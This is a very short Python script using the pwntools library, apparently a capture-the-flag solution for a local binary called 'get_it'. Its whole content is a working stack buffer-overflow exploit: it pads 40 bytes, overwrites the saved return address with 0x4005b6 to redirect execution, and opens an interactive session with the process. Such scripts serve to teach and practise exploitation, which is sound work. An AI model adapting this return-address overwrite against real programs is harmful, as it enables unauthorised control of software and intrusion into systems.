import pwn

io = pwn.process("./get_it")

payload = b"A" * 40
payload += 0x00000000004005b6.to_bytes(8, "little")

io.sendline(payload)
io.interactive()
